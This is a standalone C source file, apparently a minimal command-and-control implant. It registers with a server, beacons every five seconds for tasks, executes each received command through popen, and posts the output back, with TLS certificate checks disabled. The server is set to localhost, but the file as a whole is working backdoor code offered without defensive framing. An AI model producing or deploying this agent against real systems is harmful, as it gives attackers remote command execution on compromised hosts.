#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

#define SERVER "https://localhost"
#define REGISTER_ENDPOINT "/register"
#define TASKS_ENDPOINT "/tasks/"
#define RESULTS_ENDPOINT "/results"

char agent_id[64] = {0};

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    strcat((char *)userp, contents);
    return size * nmemb;
}

void register_agent() {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    const char *payload = "{\"hostname\":\"my-agent\",\"ip\":\"127.0.0.1\"}";
    char response[1024] = {0};

    curl_easy_setopt(curl, CURLOPT_URL, SERVER REGISTER_ENDPOINT);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // skip cert verification
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    // Simple extract of agent ID (not robust JSON parsing)
    char *id_ptr = strstr(response, "\"id\":\"");
    if (id_ptr) {
        sscanf(id_ptr, "\"id\":\"%63[^\"]", agent_id);
        printf("[+] Registered. Agent ID: %s\n", agent_id);
    }
}

void send_result(const char *task_id, const char *output) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    char post_data[2048];
    snprintf(post_data, sizeof(post_data),
             "{\"agent_id\":\"%s\",\"task_id\":\"%s\",\"output\":\"%s\"}",
             agent_id, task_id, output);

    curl_easy_setopt(curl, CURLOPT_URL, SERVER RESULTS_ENDPOINT);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
}

void poll_and_execute() {
    char url[256];
    snprintf(url, sizeof(url), "%s%s%s", SERVER, TASKS_ENDPOINT, agent_id);

    CURL *curl = curl_easy_init();
    if (!curl) return;

    while (1) {
        char response[2048] = {0};

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        curl_easy_perform(curl);

        // Naive JSON array parsing for {"id":"xyz","command":"whoami"}
        char *task = strstr(response, "\"id\":\"");
        while (task) {
            char task_id[64], command[512];
            if (sscanf(task, "\"id\":\"%63[^\"]\",\"command\":\"%511[^\"]", task_id, command) == 2) {
                printf("[>] Task received: %s\n", command);

                // Execute
                char result[1024] = {0};
                FILE *fp = popen(command, "r");
                if (fp) {
                    fread(result, 1, sizeof(result) - 1, fp);
                    pclose(fp);
                }

                send_result(task_id, result);
            }
            task = strstr(task + 1, "\"id\":\"");
        }

        sleep(5); // Beacon interval
    }

    curl_easy_cleanup(curl);
}

int main() {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    register_agent();
    if (strlen(agent_id) > 0) {
        poll_and_execute();
    }
    curl_global_cleanup();
    return 0;
}

